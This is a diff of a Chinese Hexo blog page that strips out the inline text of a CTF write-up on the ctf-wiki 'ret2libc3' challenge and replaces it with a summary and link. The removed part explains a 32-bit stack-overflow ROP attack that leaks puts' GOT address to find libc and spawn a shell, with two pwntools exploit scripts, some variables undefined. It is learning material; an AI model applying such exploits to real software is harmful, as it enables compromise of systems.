@@ -646,9 +646,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-08-29 20:45:22 / 修改时间：20:48:13" itemprop="dateCreated datePublished" datetime="2023-08-29T20:45:22+08:00">2023-08-29</time>
+      <time title="创建时间：2023-08-29 20:45:22" itemprop="dateCreated datePublished" datetime="2023-08-29T20:45:22+08:00">2023-08-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-30 10:33:57" itemprop="dateModified" datetime="2023-08-30T10:33:57+08:00">2023-08-30</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -667,14 +673,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.7k</span>
+      <span>13k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>11 分钟</span>
     </span>
 </div>
 
@@ -685,32 +691,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开NX</p>
-<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081254951.png"></p>
-<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
-<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081256604.png" alt="image-20230808125622556"></p>
-<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
-<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081257190.png" alt="image-20230808125734100"><br>（这里直接盗图了……)</p>
-<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>或者写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
-
-<h3 id="一定注意发送pay前接收的内容"><a href="#一定注意发送pay前接收的内容" class="headerlink" title="一定注意发送pay前接收的内容"></a>一定注意发送pay前接收的内容</h3><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>搜索libc常用方法：</p>
-<ul>
-<li>LibcSearcher</li>
-<li>网站查找 <a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a><br><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=_rtld_global:0">llibc database search</a></li>
-<li>libc-database<br>参考资料：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></li>
-</ul>
-<p>对于返回地址不同而导致的输入偏移不同<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/83f55c55c173">https://www.jianshu.com/p/83f55c55c173</a></p>
-
+          <h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/be5100f9/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1407,13 +1396,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">76k</span>
+    <span title="站点总字数">86k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:09</span>
+    <span title="站点阅读时长">1:18</span>
   </span>
 </div>
 <div class="busuanzi-count">
